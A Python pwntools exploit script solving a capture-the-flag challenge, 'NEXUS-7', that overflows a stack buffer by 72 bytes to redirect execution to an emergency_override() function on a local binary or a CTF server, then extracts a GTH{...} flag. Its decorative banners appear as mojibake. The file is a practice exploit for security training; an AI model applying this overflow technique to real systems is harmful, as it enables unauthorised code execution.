#!/usr/bin/env python3
"""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘              NEXUS-7 EXPLOIT - Abandoned Space Station CTF               â•‘
â•‘                                                                           â•‘
â•‘   Vulnerability: Stack Buffer Overflow (ret2win)                         â•‘
â•‘   Target: Overflow signal_buffer to overwrite return address             â•‘
â•‘   Goal: Redirect execution to emergency_override() function              â•‘
â•‘   Flag Format: GTH{...}                                                   â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Usage:
    Local:  python3 exploit.py
    Remote: python3 exploit.py REMOTE

Example:
    python3 exploit.py
    python3 exploit.py REMOTE
"""

from pwn import *
import sys

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# CONFIGURATION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

BINARY = './nexus7'

# Remote server configuration
REMOTE_HOST = "ctf.neocyberrange.com"
REMOTE_PORT = 9002

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# SETUP
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def setup_context():
    """Configure pwntools for x86_64."""
    context.arch = 'amd64'
    context.os = 'linux'
    context.endian = 'little'
    context.log_level = 'info'

def get_process():
    """Get local or remote process."""
    if len(sys.argv) >= 2 and sys.argv[1] == 'REMOTE':
        log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}")
        return remote(REMOTE_HOST, REMOTE_PORT)
    else:
        log.info(f"Starting local: {BINARY}")
        return process(BINARY)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# EXPLOIT
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def find_offset():
    """Find the offset to overwrite the return address."""
    return 72

def get_win_function(elf):
    """Get the address of emergency_override()."""
    win_addr = elf.symbols['emergency_override']
    log.success(f"emergency_override @ {hex(win_addr)}")
    return win_addr

def exploit(p, offset, win_addr):
    """Send the exploit payload."""
    log.info("Crafting payload...")
    
    payload = b'A' * offset
    payload += p64(win_addr)
    
    log.info(f"Payload size: {len(payload)} bytes")
    log.info(f"Offset: {offset}, Target: {hex(win_addr)}")
    
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'>', payload)
    
    log.success("Payload sent!")

def get_flag(p):
    """Extract the flag from output."""
    try:
        response = p.recvall(timeout=3).decode(errors='ignore')
        
        import re
        flag_match = re.search(r'GTH\{[^}]+\}', response)
        
        if flag_match:
            return flag_match.group(0)
        else:
            print(response)
            return None
    except:
        return None

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MAIN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def main():
    print("""
    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
    â•‘          NEXUS-7 EXPLOIT - Buffer Overflow Attack            â•‘
    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    setup_context()
    
    elf = ELF(BINARY, checksec=False)
    win_addr = get_win_function(elf)
    offset = find_offset()
    
    p = get_process()
    p.recvuntil(b'Terminal online')
    
    try:
        exploit(p, offset, win_addr)
        flag = get_flag(p)
        
        if flag:
            print("\n" + "="*60)
            print(f"  ğŸš€ FLAG: {flag}")
            print("="*60 + "\n")
        else:
            log.warning("Could not extract flag, entering interactive mode...")
            p.interactive()
            
    except Exception as e:
        log.error(f"Exploit failed: {e}")
        p.close()
        return 1
    
    return 0

if __name__ == '__main__':
    exit(main())
